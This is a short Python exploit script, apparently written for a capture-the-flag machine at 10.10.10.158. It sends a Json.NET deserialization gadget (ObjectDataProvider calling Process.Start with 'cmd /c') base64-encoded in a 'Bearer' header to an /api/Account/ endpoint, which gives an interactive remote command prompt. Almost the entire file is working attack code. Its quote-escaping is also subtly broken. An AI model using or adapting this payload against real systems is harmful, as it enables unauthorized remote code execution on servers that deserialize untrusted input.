#!/usr/bin/env python3
import base64
import requests
from string import Template

class color:
   PURPLE = '\033[95m'
   CYAN = '\033[96m'
   DARKCYAN = '\033[36m'
   BLUE = '\033[94m'
   GREEN = '\033[92m'
   YELLOW = '\033[93m'
   RED = '\033[91m'
   BOLD = '\033[1m'
   UNDERLINE = '\033[4m'
   END = '\033[0m'

box_ip = "10.10.10.158"

payload_template = Template('''{
    '$type':'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35', 
    'MethodName':'Start',
    'MethodParameters':{
        '$type':'System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
        '$values':['cmd','/c $cmd']
    },
    'ObjectInstance':{'$type':'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'}
}''')

print(color.PURPLE + "\n[*] Json command injector created by XMA")
print("------------------------------------------\n" + color.END)

print("[*] Injects a command via .NET deserialization")
while True:
   cmd = input("[?] Command: ")

   if cmd == "exit":
      break
   if len(cmd.strip()) == 0:
      print("Contiune")
      continue

   cmd = cmd.replace("'", "\'")
   cmd = cmd.replace("\"", "\\\"")
   cmd = cmd.replace("\\", "\\\\")
   payload = payload_template.safe_substitute({'cmd': cmd})
   payload_base64 = str(base64.b64encode(payload.encode("utf-8")), "utf-8")

   requests.get("http://" + box_ip + "/api/Account/", headers={
      "Bearer": payload_base64
   })
